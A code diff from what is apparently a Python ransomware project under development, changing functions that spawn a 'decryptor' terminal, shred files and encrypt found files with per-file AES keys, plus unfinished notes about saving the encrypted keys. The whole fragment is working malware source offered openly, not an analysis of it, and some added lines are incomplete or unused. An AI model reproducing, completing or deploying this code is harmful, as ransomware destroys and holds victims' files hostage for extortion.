@@ -57,9 +57,9 @@ def open_decryptor():
     if(decryptor_process_exists):
         return
     
-    spawn_new_process()
-
-
+    gnome = 'gnome-terminal --command ./decryptor'
+    xfce = 'xfce4-terminal --command=./decryptor'
+    
 
 
 def new_process():
@@ -115,6 +115,9 @@ def shred(file_name,  passes=1):
 
 
 def start_encryption(files):
+    if(not files):
+        return None
+
     AES_and_base64_path = []
     for found_file in files:
         key = generate_keys.generate_key(32, True)
@@ -144,6 +147,11 @@ def menu():
     new_files = get_files.find_files(test_path)
     aes_keys_and_base64_path = start_encryption(new_files)
     
+    # if(aes_keys_and_base64_path != None):
+    #     with open(ransomware_path + '/AES_encrypted_keys.txt', 'rb') as f:    
+    #         append to the end of the file 
+
+
     # write at the end of the file 
 
 
